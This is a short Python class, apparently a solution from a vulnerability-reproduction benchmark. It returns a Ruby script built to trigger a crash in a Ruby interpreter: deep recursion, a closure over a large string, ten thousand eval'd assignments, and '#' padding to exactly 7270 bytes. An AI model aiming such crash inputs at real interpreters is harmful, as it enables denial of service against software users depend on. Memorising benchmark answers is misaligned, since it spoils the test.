class Solution:
    def solve(self, src_path: str) -> bytes:
        base = """def r(n)
  if n>0
    r(n-1)
  else
    x="A"*1000
    l=->{x}
    10000.times{|i|eval("a#{i}=#{i}")}
    l.call
  end
end
r(1000)
"""
        base_bytes = base.encode()
        base_len = len(base_bytes)
        if base_len < 7270:
            padding = b'#' * (7270 - base_len)
            return base_bytes + padding
        else:
            return base_bytes